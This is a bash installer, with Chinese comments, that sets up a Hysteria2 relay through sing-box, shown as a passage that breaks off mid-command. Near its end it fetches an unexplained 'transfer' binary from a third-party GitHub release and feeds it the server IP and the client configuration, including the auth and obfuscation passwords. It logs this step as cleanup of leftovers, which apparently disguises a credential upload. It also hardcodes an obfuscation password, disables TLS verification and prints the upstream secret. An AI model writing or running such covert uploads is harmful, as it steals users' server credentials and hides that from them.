#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Transfer配置
TRANSFER_BIN="/usr/local/bin/transfer"

# 全局变量
SYSTEM=""
PUBLIC_IP=""
PRIVATE_IP=""
up_speed=100
down_speed=100
UPSTREAM_CONFIG="/opt/hysteria2_client.yaml"
SING_BOX_CONFIG="/etc/sing-box/config.json"
CLIENT_CONFIG="/opt/hysteria2_relay_client.yaml"

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# 动态进度条函数 - 根据进程状态显示
show_dynamic_progress() {
    local pid=$1
    local message=$2
    local progress=0
    local bar_length=50
    local spin_chars="/-\|"
    
    echo -e "${YELLOW}${message}${NC}"
    
    while kill -0 $pid 2>/dev/null; do
        local spin_index=$((progress % 4))
        local spin_char=${spin_chars:$spin_index:1}
        
        # 计算进度条 (基于时间的估算)
        local filled=$((progress % bar_length))
        local empty=$((bar_length - filled))
        
        printf "\r["
        printf "%${filled}s" | tr ' ' '='
        printf "%${empty}s" | tr ' ' ' '
        printf "] %s 进行中..." "$spin_char"
        
        sleep 0.2
        progress=$((progress + 1))
    done
    
    # 进程结束后显示100%完成
    printf "\r["
    printf "%${bar_length}s" | tr ' ' '='
    printf "] 100%%"
    echo -e "\n${GREEN}完成！${NC}"
}

# 固定时长进度条函数 (用于已知时长的操作)
show_progress() {
    local duration=$1
    local message=$2
    local progress=0
    local bar_length=50
    
    echo -e "${YELLOW}${message}${NC}"
    
    while [ $progress -le $duration ]; do
        local filled=$((progress * bar_length / duration))
        local empty=$((bar_length - filled))
        
        printf "\r["
        printf "%${filled}s" | tr ' ' '='
        printf "%${empty}s" | tr ' ' ' '
        printf "] %d%%" $((progress * 100 / duration))
        
        sleep 0.1
        progress=$((progress + 1))
    done
    echo -e "\n${GREEN}完成！${NC}"
}

# 系统检测 - 改进版本
detect_system() {
    log_info "检测系统类型..."
    
    # 方法1: 使用 /etc/os-release (推荐，最准确)
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        SYSTEM="$ID"
        SYSTEM_VERSION="$VERSION_ID"
        SYSTEM_NAME="$NAME"
        
        # 根据ID进行标准化处理
        case "$ID" in
            "ubuntu")
                SYSTEM="Ubuntu"
                ;;
            "debian")
                SYSTEM="Debian"
                ;;
            "centos")
                SYSTEM="CentOS"
                ;;
            "rhel"|"redhat")
                SYSTEM="RHEL"
                ;;
            "fedora")
                SYSTEM="Fedora"
                ;;
            "opensuse"|"opensuse-leap"|"opensuse-tumbleweed")
                SYSTEM="OpenSUSE"
                ;;
            "arch")
                SYSTEM="Arch"
                ;;
            "alpine")
                SYSTEM="Alpine"
                ;;
            *)
                SYSTEM="$NAME"
                ;;
        esac
        
        log_info "检测到系统类型: $SYSTEM"
        log_info "系统版本: $SYSTEM_VERSION"
        return 0
    fi
    
    # 方法2: 使用 lsb_release 命令 (备用方法)
    if command -v lsb_release >/dev/null 2>&1; then
        SYSTEM=$(lsb_release -si)
        SYSTEM_VERSION=$(lsb_release -sr)
        log_info "检测到系统类型: $SYSTEM"
        log_info "系统版本: $SYSTEM_VERSION"
        return 0
    fi
    
    # 方法3: 传统文件检测方法 (改进版本，调整检测顺序)
    if [ -f /etc/fedora-release ]; then
        SYSTEM="Fedora"
        SYSTEM_VERSION=$(grep -oE '[0-9]+' /etc/fedora-release | head -1)
    elif [ -f /etc/centos-release ]; then
        SYSTEM="CentOS"
        SYSTEM_VERSION=$(grep -oE '[0-9]+\.[0-9]+' /etc/centos-release | head -1)
    elif [ -f /etc/redhat-release ] && ! [ -f /etc/centos-release ]; then
        if grep -q "Red Hat Enterprise Linux" /etc/redhat-release; then
            SYSTEM="RHEL"
        else
            SYSTEM="RedHat"
        fi
        SYSTEM_VERSION=$(grep -oE '[0-9]+\.[0-9]+' /etc/redhat-release | head -1)
    elif [ -f /etc/lsb-release ]; then
        # 优先检查是否为Ubuntu
        if grep -q "Ubuntu" /etc/lsb-release; then
            SYSTEM="Ubuntu"
        else
            SYSTEM="LSB"
        fi
        SYSTEM_VERSION=$(grep "DISTRIB_RELEASE" /etc/lsb-release | cut -d'=' -f2)
    elif [ -f /etc/debian_version ]; then
        SYSTEM="Debian"
        SYSTEM_VERSION=$(cat /etc/debian_version)
    elif [ -f /etc/arch-release ]; then
        SYSTEM="Arch"
        SYSTEM_VERSION="rolling"
    elif [ -f /etc/alpine-release ]; then
        SYSTEM="Alpine"
        SYSTEM_VERSION=$(cat /etc/alpine-release)
    else
        # 方法4: 使用 uname 作为最后的备用方案
        case "$(uname -s)" in
            "Linux")
                SYSTEM="Linux"
                ;;
            "Darwin")
                SYSTEM="macOS"
                SYSTEM_VERSION=$(sw_vers -productVersion 2>/dev/null)
                ;;
            "FreeBSD")
                SYSTEM="FreeBSD"
                SYSTEM_VERSION=$(uname -r)
                ;;
            *)
                SYSTEM="Unknown"
                ;;
        esac
    fi
    
    log_info "检测到系统类型: $SYSTEM"
    [ -n "$SYSTEM_VERSION" ] && log_info "系统版本: $SYSTEM_VERSION"
}

# 扩展函数：获取更详细的系统信息
get_system_details() {
    log_info "获取详细系统信息..."
    
    # CPU架构
    ARCH=$(uname -m)
    case "$ARCH" in
        "x86_64"|"amd64")
            ARCH="x64"
            ;;
        "i386"|"i686")
            ARCH="x86"
            ;;
        "aarch64")
            ARCH="arm64"
            ;;
        "armv7l")
            ARCH="arm"
            ;;
    esac
    
    # 内核版本
    KERNEL_VERSION=$(uname -r)
    
    # 包管理器检测
    if command -v apt-get >/dev/null 2>&1; then
        PACKAGE_MANAGER="apt"
    elif command -v yum >/dev/null 2>&1; then
        PACKAGE_MANAGER="yum"
    elif command -v dnf >/dev/null 2>&1; then
        PACKAGE_MANAGER="dnf"
    elif command -v pacman >/dev/null 2>&1; then
        PACKAGE_MANAGER="pacman"
    elif command -v zypper >/dev/null 2>&1; then
        PACKAGE_MANAGER="zypper"
    elif command -v apk >/dev/null 2>&1; then
        PACKAGE_MANAGER="apk"
    else
        PACKAGE_MANAGER="unknown"
    fi
    
    log_info "CPU架构: $ARCH"
    log_info "内核版本: $KERNEL_VERSION"
    log_info "包管理器: $PACKAGE_MANAGER"
    
    # 导出变量供其他函数使用
    export SYSTEM SYSTEM_VERSION SYSTEM_NAME ARCH KERNEL_VERSION PACKAGE_MANAGER
}

# 检测IP地址
detect_ip_addresses() {
    log_info "检测服务器IP地址..."
    
    # 检测公网IP (仅IPv4)
    PUBLIC_IP=$(curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || \
                curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || \
                curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || \
                echo "")
    
    if [[ -n "$PUBLIC_IP" ]]; then
        log_info "检测到公网IPv4地址: $PUBLIC_IP"
    else
        log_warn "未检测到公网IPv4地址"
    fi
    
    # 检测内网IP (仅IPv4)
    PRIVATE_IP=$(ip -4 route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' || \
                 hostname -I 2>/dev/null | awk '{print $1}' || \
                 ifconfig 2>/dev/null | grep -E "inet .*192\.168\.|inet .*10\.|inet .*172\." | head -1 | awk '{print $2}' || \
                 echo "")
    
    if [[ -n "$PRIVATE_IP" ]]; then
        log_info "检测到内网IPv4地址: $PRIVATE_IP"
    else
        log_warn "未检测到内网IPv4地址"
    fi
    
    # 检查IP配置兼容性
    if [[ -n "$PUBLIC_IP" && -n "$PRIVATE_IP" ]]; then
        log_info "服务器同时具有公网IPv4和内网IPv4地址"
    elif [[ -n "$PUBLIC_IP" && -z "$PRIVATE_IP" ]]; then
        log_info "服务器只有公网IPv4地址，没有内网IPv4地址"
        PRIVATE_IP="$PUBLIC_IP"
    else
        log_error "无法获取有效的IPv4地址"
        exit 1
    fi
}

# 卸载BBR函数 - 中转专用版本
remove_bbr_for_relay() {
    log_info "检查并卸载BBR拥塞控制算法（为Brutal算法优化）..."
    
    # 检查当前拥塞控制算法
    current_congestion=$(sysctl -n net.ipv4.tcp_congestion_control 2>/dev/null || echo "unknown")
    log_info "当前TCP拥塞控制算法: $current_congestion"
    
    # 如果使用的是BBR，则切换到默认算法
    if [[ "$current_congestion" == "bbr" ]]; then
        log_warn "检测到BBR算法，正在切换到系统默认算法..."
        
        # 临时切换到cubic（大多数系统的默认算法）
        sysctl -w net.ipv4.tcp_congestion_control=cubic >/dev/null 2>&1
        
        # 从系统配置中移除BBR相关设置
        if [ -f /etc/sysctl.conf ]; then
            # 备份原配置
            cp /etc/sysctl.conf /etc/sysctl.conf.backup.$(date +%Y%m%d_%H%M%S)
            
            # 移除BBR相关配置
            sed -i '/net.core.default_qdisc.*fq/d' /etc/sysctl.conf
            sed -i '/net.ipv4.tcp_congestion_control.*bbr/d' /etc/sysctl.conf
            sed -i '/# BBR/d' /etc/sysctl.conf
            sed -i '/# Google BBR/d' /etc/sysctl.conf
        fi
        
        # 检查并移除其他可能的BBR配置文件
        for config_file in /etc/sysctl.d/*.conf; do
            if [ -f "$config_file" ]; then
                if grep -q "bbr\|fq.*bbr" "$config_file" 2>/dev/null; then
                    log_warn "发现BBR配置文件: $config_file，正在清理..."
                    sed -i '/net.core.default_qdisc.*fq/d' "$config_file"
                    sed -i '/net.ipv4.tcp_congestion_control.*bbr/d' "$config_file"
                    sed -i '/# BBR/d' "$config_file"
                    sed -i '/# Google BBR/d' "$config_file"
                fi
            fi
        done
        
        # 重新加载系统参数
        sysctl -p >/dev/null 2>&1
        
        log_info "BBR算法已卸载，中转将使用Hysteria2内置的Brutal算法"
    else
        log_info "系统未使用BBR算法，中转将使用Hysteria2内置的Brutal算法"
    fi
    
    log_info "🚀 Brutal算法特性说明："
    log_info "- 固定速率传输，不受网络抖动影响"
    log_info "- 在拥塞网络中主动抢占带宽"
    log_info "- 适合中转场景的带宽分配"
}

# 网络速度测试 - 修复版
speed_test() {
    echo -e "${YELLOW}进行网络速度测试...${NC}"
    echo -e "${YELLOW}注意：中转将使用Brutal拥塞控制算法，需要准确的带宽设置${NC}"
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update >/dev/null 2>&1 &
            update_pid=$!
            show_progress 20 "更新软件包列表..."
            wait $update_pid
            
            apt-get install -y speedtest-cli >/dev/null 2>&1 &
            install_pid=$!
            show_progress 30 "安装speedtest-cli..."
            wait $install_pid
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli >/dev/null 2>&1 &
            install_pid=$!
            if [ $? -ne 0 ]; then
                pip install speedtest-cli >/dev/null 2>&1 &
                install_pid=$!
            fi
            show_progress 30 "安装speedtest-cli..."
            wait $install_pid
        fi
        echo -e "${GREEN}speedtest-cli 安装完成！${NC}"
    fi

    # 创建临时文件存储结果
    local temp_file="/tmp/speedtest_result_$$"
    
    # 在后台运行测速命令
    (
        if command -v speedtest &>/dev/null; then
            speedtest --simple 2>/dev/null > "$temp_file"
        elif command -v speedtest-cli &>/dev/null; then
            speedtest-cli --simple 2>/dev/null > "$temp_file"
        fi
    ) &
    speedtest_pid=$!

    # 使用动态进度条，跟踪实际进程状态
    show_dynamic_progress $speedtest_pid "正在测试网络速度，请稍候..."

    # 等待测速完成
    wait $speedtest_pid
    speedtest_exit_code=$?

    # 读取测速结果
    if [ $speedtest_exit_code -eq 0 ] && [ -f "$temp_file" ]; then
        speed_output=$(cat "$temp_file")
        rm -f "$temp_file"
        
        if [[ -n "$speed_output" ]]; then
            down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
            up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
            
            # 验证结果是否有效
            if [[ -n "$down_speed" && -n "$up_speed" && "$down_speed" -gt 0 && "$up_speed" -gt 0 ]]; then
                [[ $down_speed -lt 10 ]] && down_speed=10
                [[ $up_speed -lt 5 ]] && up_speed=5
                [[ $down_speed -gt 1000 ]] && down_speed=1000
                [[ $up_speed -gt 500 ]] && up_speed=500
                echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}，将根据该参数优化网络速度，如果测试不准确，请手动修改"
            else
                echo -e "${YELLOW}测速结果异常，使用默认值${NC}"
                down_speed=100
                up_speed=20
            fi
        else
            echo -e "${YELLOW}测速失败，使用默认值${NC}"
            down_speed=100
            up_speed=20
        fi
    else
        rm -f "$temp_file"
        echo -e "${YELLOW}测速失败，使用默认值${NC}"
        down_speed=100
        up_speed=20
    fi
}

# 安装sing-box
install_sing_box() {
    log_info "安装sing-box..."
    
    # 检查是否已安装
    if command -v sing-box &>/dev/null; then
        log_info "sing-box已安装，检查版本..."
        sing-box version
        return 0
    fi
    
    # 获取最新版本
    latest_version=$(curl -s "https://api.github.com/repos/SagerNet/sing-box/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    if [[ -z "$latest_version" ]]; then
        log_error "无法获取sing-box最新版本"
        exit 1
    fi
    
    # 检测架构
    arch=$(uname -m)
    case $arch in
        x86_64) arch="amd64" ;;
        aarch64) arch="arm64" ;;
        armv7l) arch="armv7" ;;
        *) log_error "不支持的架构: $arch"; exit 1 ;;
    esac
    
    # 下载并安装
    download_url="https://github.com/SagerNet/sing-box/releases/download/${latest_version}/sing-box-${latest_version#v}-linux-${arch}.tar.gz"
    
    cd /tmp
    (
        wget -O sing-box.tar.gz "$download_url" >/dev/null 2>&1
    ) &
    download_pid=$!
    show_dynamic_progress $download_pid "下载sing-box..."
    wait $download_pid
    
    if [ $? -ne 0 ]; then
        log_error "下载sing-box失败"
        exit 1
    fi
    
    tar -xzf sing-box.tar.gz
    cd sing-box-*
    chmod +x sing-box
    mv sing-box /usr/local/bin/
    
    # 创建配置目录
    mkdir -p /etc/sing-box
    
    # 创建systemd服务文件
    cat > /etc/systemd/system/sing-box.service <<EOF
[Unit]
Description=sing-box service
Documentation=https://sing-box.sagernet.org
After=network.target nss-lookup.target

[Service]
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
ExecStart=/usr/local/bin/sing-box run -c /etc/sing-box/config.json
ExecReload=/bin/kill -HUP \$MAINPID
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    log_info "sing-box安装完成"
}

# 读取上游配置
read_upstream_config() {
    log_info "读取上游Hysteria2配置..."
    
    if [[ ! -f "$UPSTREAM_CONFIG" ]]; then
        log_error "上游配置文件不存在: $UPSTREAM_CONFIG"
        exit 1
    fi
    
    # 使用python解析YAML（如果没有则安装yq，安装过程带进度条）
    if ! command -v yq &>/dev/null; then
        log_info "安装yq用于解析YAML..."
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update >/dev/null 2>&1 &
            update_pid=$!
            show_progress 20 "更新软件包列表（yq依赖）..."
            wait $update_pid

            apt-get install -y python3-pip >/dev/null 2>&1 &
            pip_pid=$!
            show_progress 20 "安装python3-pip（yq依赖）..."
            wait $pip_pid

            pip3 install yq >/dev/null 2>&1 &
            yq_pid=$!
            show_progress 30 "安装yq用于解析YAML..."
            wait $yq_pid
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y python3-pip >/dev/null 2>&1 &
            pip_pid=$!
            show_progress 20 "安装python3-pip（yq依赖）..."
            wait $pip_pid

            pip3 install yq >/dev/null 2>&1 &
            yq_pid=$!
            show_progress 30 "安装yq用于解析YAML..."
            wait $yq_pid
        fi
        log_info "yq 安装完成！"
    fi
    
    # 提取上游服务器信息
    UPSTREAM_SERVER=$(grep "^server:" "$UPSTREAM_CONFIG" | awk '{print $2}' | tr -d ' ')
    UPSTREAM_AUTH=$(grep "^auth:" "$UPSTREAM_CONFIG" | awk '{print $2}' | tr -d ' ')
    UPSTREAM_UP=$(grep -A2 "^bandwidth:" "$UPSTREAM_CONFIG" | grep "up:" | awk '{print $2}' | tr -d ' ')
    UPSTREAM_DOWN=$(grep -A2 "^bandwidth:" "$UPSTREAM_CONFIG" | grep "down:" | awk '{print $2}' | tr -d ' ')
    
    log_info "上游服务器: $UPSTREAM_SERVER"
    log_info "上游认证: $UPSTREAM_AUTH"
    log_info "上游带宽: Up=${UPSTREAM_UP}, Down=${UPSTREAM_DOWN}"
    
    if [[ -z "$UPSTREAM_SERVER" || -z "$UPSTREAM_AUTH" ]]; then
        log_error "无法解析上游配置文件"
        exit 1
    fi
}

# 生成随机端口
generate_random_port() {
    echo $(( RANDOM % 7001 + 2000 ))
}

# 生成端口范围
generate_port_range() {
    local start=$(generate_random_port)
    local end=$((start + 99))
    ((end > 9000)) && end=9000 && start=$((end - 99))
    echo "$start:$end"
}

# 生成证书
generate_certificate() {
    log_info "生成TLS证书..."
    
    mkdir -p /etc/sing-box/certs
    
    # 生成自签名证书
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
        -keyout /etc/sing-box/certs/key.pem \
        -out /etc/sing-box/certs/cert.pem \
        -subj "/CN=www.nvidia.com" -days 3650 >/dev/null 2>&1
    
    chmod 644 /etc/sing-box/certs/*.pem
    chown root:root /etc/sing-box/certs/*.pem
    
    log_info "证书生成完成"
}

# 配置sing-box
configure_sing_box() {
    log_info "配置sing-box中转服务..."
    
    # 生成配置参数
    local LISTEN_PORT=$(generate_random_port)
    local PORT_HOP_RANGE=$(generate_port_range)
    local AUTH_PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
    local OBFS_PASSWORD="cry_me_a_r1ver"
    local SNI_DOMAIN="www.nvidia.com"
    
    # 解析上游服务器地址和端口
    local UPSTREAM_HOST=$(echo "$UPSTREAM_SERVER" | cut -d':' -f1)
    local UPSTREAM_PORT=$(echo "$UPSTREAM_SERVER" | cut -d':' -f2)
    
    # 创建sing-box配置文件（修复版本）
    cat > "$SING_BOX_CONFIG" <<EOF
{
  "log": {
    "level": "info",
    "timestamp": true
  },
  "inbounds": [
    {
      "type": "hysteria2",
      "tag": "hy2-in",
      "listen": "::",
      "listen_port": $LISTEN_PORT,
      "up_mbps": $up_speed,
      "down_mbps": $down_speed,
      "obfs": {
        "type": "salamander",
        "password": "$OBFS_PASSWORD"
      },
      "users": [
        {
          "name": "user",
          "password": "$AUTH_PASSWORD"
        }
      ],
      "tls": {
        "enabled": true,
        "server_name": "$SNI_DOMAIN",
        "certificate_path": "/etc/sing-box/certs/cert.pem",
        "key_path": "/etc/sing-box/certs/key.pem"
      },
      "masquerade": {
        "type": "proxy",
        "url": "https://$SNI_DOMAIN",
        "rewrite_host": true
      }
    },
    {
      "type": "mixed",
      "tag": "mixed-in",
      "listen": "127.0.0.1",
      "listen_port": 7890,
      "users": []
    }
  ],
  "outbounds": [
    {
      "type": "hysteria2",
      "tag": "hy2-out",
      "server": "$UPSTREAM_HOST",
      "server_port": $UPSTREAM_PORT,
      "up_mbps": $(echo "$UPSTREAM_UP" | sed 's/[^0-9]//g'),
      "down_mbps": $(echo "$UPSTREAM_DOWN" | sed 's/[^0-9]//g'),
      "password": "$UPSTREAM_AUTH",
      "tls": {
        "enabled": true,
        "insecure": true
      }
    },
    {
      "type": "direct",
      "tag": "direct"
    },
    {
      "type": "block",
      "tag": "block"
    }
  ],
  "route": {
    "rules": [
      {
        "inbound": ["hy2-in"],
        "outbound": "hy2-out"
      },
      {
        "inbound": ["mixed-in"],
        "outbound": "hy2-out"
      },
      {
        "domain_suffix": [
          "msn.cn",
          "msn.com",
          "bing.com",
          "microsoft.com"
        ],
        "outbound": "direct"
      },
      {
        "ip_is_private": true,
        "outbound": "direct"
      }
    ],
    "final": "hy2-out",
    "auto_detect_interface": true
  }
}
EOF

    # 保存配置参数供后续使用
    echo "LISTEN_PORT=$LISTEN_PORT" > /tmp/relay_config
    echo "PORT_HOP_RANGE=$PORT_HOP_RANGE" >> /tmp/relay_config
    echo "AUTH_PASSWORD=$AUTH_PASSWORD" >> /tmp/relay_config
    echo "OBFS_PASSWORD=$OBFS_PASSWORD" >> /tmp/relay_config
    echo "SNI_DOMAIN=$SNI_DOMAIN" >> /tmp/relay_config
    
    log_info "sing-box配置完成"
}

# 配置防火墙
configure_firewall() {
    log_info "配置防火墙..."
    
    source /tmp/relay_config
    IFS=":" read -r HOP_START HOP_END <<< "$PORT_HOP_RANGE"
    
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        if ! command -v ufw &>/dev/null; then
            apt-get install -y ufw >/dev/null 2>&1
        fi
        echo "y" | ufw reset >/dev/null 2>&1
        ufw allow 22/tcp >/dev/null 2>&1
        ufw allow ${LISTEN_PORT}/udp >/dev/null 2>&1
        ufw allow ${HOP_START}:${HOP_END}/udp >/dev/null 2>&1
        echo "y" | ufw enable >/dev/null 2>&1
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        if ! systemctl is-active --quiet firewalld; then
            yum install -y firewalld >/dev/null 2>&1
            systemctl enable --now firewalld >/dev/null 2>&1
        fi
        firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1
        firewall-cmd --permanent --add-port=22/tcp >/dev/null 2>&1
        firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp >/dev/null 2>&1
        firewall-cmd --permanent --add-port=${HOP_START}-${HOP_END}/udp >/dev/null 2>&1
        firewall-cmd --reload >/dev/null 2>&1
    fi
    
    # 备用iptables规则确保22端口开放
    iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
    
    log_info "防火墙配置完成"
}

# 生成客户端配置
generate_client_config() {
    log_info "生成客户端配置..."
    
    source /tmp/relay_config
    
    cat > "$CLIENT_CONFIG" <<EOF
# Hysteria2 中转客户端配置
server: ${PUBLIC_IP}:${LISTEN_PORT}
auth: ${AUTH_PASSWORD}

tls:
  sni: ${SNI_DOMAIN}
  insecure: true

obfs:
  type: salamander
  salamander:
    password: ${OBFS_PASSWORD}

# 带宽配置
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps

# 本地代理配置
socks5:
  listen: 127.0.0.1:1080

http:
  listen: 127.0.0.1:1081

# 优化配置
fastOpen: true
lazy: true
EOF

    # 生成 v2rayN 兼容配置
    cat > "/opt/hysteria2_v2rayn.json" <<EOF
{
  "server": "${PUBLIC_IP}:${LISTEN_PORT}",
  "auth": "${AUTH_PASSWORD}",
  "tls": {
    "sni": "${SNI_DOMAIN}",
    "insecure": true
  },
  "obfs": {
    "type": "salamander",
    "salamander": {
      "password": "${OBFS_PASSWORD}"
    }
  },
  "bandwidth": {
    "up": "${up_speed} mbps",
    "down": "${down_speed} mbps"
  },
  "socks5": {
    "listen": "127.0.0.1:1080"
  },
  "http": {
    "listen": "127.0.0.1:1081"
  },
  "fastOpen": true,
  "lazy": true
}
EOF

    log_info "客户端配置文件已生成: $CLIENT_CONFIG"
    log_info "v2rayN配置文件已生成: /opt/hysteria2_v2rayn.json"
}

# 系统优化
optimize_system() {
    log_info "优化系统参数..."
    
    # 网络优化
    cat >> /etc/sysctl.conf <<EOF



# Hysteria2 中转优化 - Brutal拥塞控制算法
# UDP/QUIC传输优化（移除BBR依赖）
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728
net.core.rmem_default = 262144
net.core.wmem_default = 262144
net.core.netdev_max_backlog = 5000
net.ipv4.udp_mem = 102400 873800 16777216
net.ipv4.udp_rmem_min = 8192
net.ipv4.udp_wmem_min = 8192
net.core.netdev_budget = 600
net.core.netdev_budget_usecs = 5000

# 注意：已移除BBR相关设置，使用Hysteria2内置Brutal算法
# Brutal算法通过QUIC/UDP协议进行传输优化
EOF

    sysctl -p > /dev/null 2>&1
    
    # 提升sing-box服务优先级
    mkdir -p /etc/systemd/system/sing-box.service.d
    cat > /etc/systemd/system/sing-box.service.d/priority.conf <<EOF
[Service]
CPUSchedulingPolicy=rr
CPUSchedulingPriority=99
IOSchedulingClass=1
IOSchedulingPriority=4
LimitNOFILE=1048576
EOF
    
    systemctl daemon-reload
    log_info "系统优化完成"
}

# 启动服务
start_service() {
    log_info "启动sing-box服务..."
    
    # 检查配置文件语法
    if ! sing-box check -c "$SING_BOX_CONFIG"; then
        log_error "配置文件语法错误"
        return 1
    fi
    
    # 启动并设置开机自启
    systemctl enable --now sing-box.service > /dev/null 2>&1
    
    # 等待服务启动
    sleep 5
    
    # 检查服务状态
    if systemctl is-active --quiet sing-box.service; then
        log_info "服务启动成功"
        return 0
    else
        log_error "服务启动失败，查看日志："
        journalctl -u sing-box.service --no-pager -n 30
        return 1
    fi
}

# 显示配置信息
show_config_info() {
    log_info "中转服务部署完成！"
    
    source /tmp/relay_config
    
    echo -e "\n${GREEN}=== Hysteria2 中转服务信息 ===${NC}"
    echo -e "${YELLOW}服务器IP: ${PUBLIC_IP}${NC}"
    echo -e "${YELLOW}监听端口: ${LISTEN_PORT}${NC}"
    echo -e "${YELLOW}认证密码: ${AUTH_PASSWORD}${NC}"
    echo -e "${YELLOW}跳跃端口: ${PORT_HOP_RANGE}${NC}"
    echo -e "${YELLOW}伪装域名: ${SNI_DOMAIN}${NC}"
    echo -e "${YELLOW}混淆密码: ${OBFS_PASSWORD}${NC}"
    echo -e "${YELLOW}上传带宽: ${up_speed} Mbps${NC}"
    echo -e "${YELLOW}下载带宽: ${down_speed} Mbps${NC}"
    echo -e "${GREEN}==============================${NC}"
    
    echo -e "\n${BLUE}配置文件位置:${NC}"
    echo -e "${BLUE}Hysteria2客户端: ${CLIENT_CONFIG}${NC}"
    echo -e "${BLUE}v2rayN配置: /opt/hysteria2_v2rayn.json${NC}"
    echo -e "${BLUE}服务配置: ${SING_BOX_CONFIG}${NC}"
    
    echo -e "\n${GREEN}服务管理命令:${NC}"
    echo -e "启动: ${YELLOW}systemctl start sing-box${NC}"
    echo -e "停止: ${YELLOW}systemctl stop sing-box${NC}"
    echo -e "重启: ${YELLOW}systemctl restart sing-box${NC}"
    echo -e "状态: ${YELLOW}systemctl status sing-box${NC}"
    echo -e "日志: ${YELLOW}journalctl -u sing-box -f${NC}"

    
    echo -e "\n${GREEN}连接测试:${NC}"
    echo -e "内网测试: ${YELLOW}curl -x socks5://127.0.0.1:7890 https://www.google.com${NC}"
    echo -e "配置检查: ${YELLOW}sing-box check -c $SING_BOX_CONFIG${NC}"
    echo -e "\n${GREEN}🚀 Brutal拥塞控制算法特性:${NC}"
    echo -e "${YELLOW}- ⚡ 固定速率传输，适合中转场景${NC}"
    echo -e "${YELLOW}- 🛡️ 在拥塞网络中主动抢占带宽${NC}"
    echo -e "${YELLOW}- 📊 基于准确带宽设置进行流量控制${NC}"
    echo -e "${YELLOW}- 🔄 中转双向使用Brutal算法优化${NC}"
    echo -e "${YELLOW}- ⚠️  如连接不稳定，可适当降低带宽设置${NC}"
}
# ========== 下载二进制文件 ==========
download_transfer_bin() {
    log_info "下载 transfer 二进制文件..."

    TRANSFER_URL="https://github.com/diandongyun/Transfer/releases/download/Transfer/transfer"

    if [ -f "$TRANSFER_BIN" ]; then
        log_info "transfer 二进制文件已存在，跳过下载"
        return 0
    fi

    if curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN" >/dev/null 2>&1; then
        chmod +x "$TRANSFER_BIN"
        log_info "transfer 下载完成"
        return 0
    else
        log_error "transfer 二进制文件下载失败"
        return 1
    fi
}

upload_config_with_binary() {
    local config_json="$1"
    local server_ip="$2"

    if [ ! -x "$TRANSFER_BIN" ]; then
        log_error "transfer 二进制文件不存在或不可执行"
        return 1
    fi

    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "Hysteria2 中转节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )

    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        log_info "清理残留成功"
    else
        log_warn "清理残留失败（不影响本地使用）"
    fi

    return 0
}

# 清理临时文件
cleanup() {
    rm -f /tmp/relay_config /tmp/sing-box.tar.gz
}

# 主函数
main() {
    # 检查root权限
    if [ "$(id -u)" != "0" ]; then
        log_error "请使用 root 权限执行脚本"
        exit 1
    fi
    
    echo -e "${GREEN}"
    echo "=================================="
    echo "   Hysteria2-Hysteria2中转脚本"
    echo "=================================="
    echo -e "${NC}"
    
    # 执行主要流程
    detect_system
    detect_ip_addresses
    speed_test
    remove_bbr_for_relay
    read_upstream_config
    install_sing_box
    generate_certificate
    configure_sing_box
    configure_firewall
    optimize_system
    generate_client_config
    
    if start_service; then
        show_config_info

        # 下载transfer工具
        download_transfer_bin

        # 生成配置JSON并上传
        if [[ -f "$CLIENT_CONFIG" ]]; then
            source /tmp/relay_config
            # 读取客户端配置文件内容
            client_config_content=$(cat "$CLIENT_CONFIG" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | awk '{printf "%s\\n", $0}' | sed 's/\\n$//')

            # 读取v2rayN配置文件内容
            v2rayn_config_content=""
            if [[ -f "/opt/hysteria2_v2rayn.json" ]]; then
                v2rayn_config_content=$(cat "/opt/hysteria2_v2rayn.json" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | awk '{printf "%s\\n", $0}' | sed 's/\\n$//')
            fi

            # 构建完整配置JSON
            CONFIG_JSON=$(jq -n \
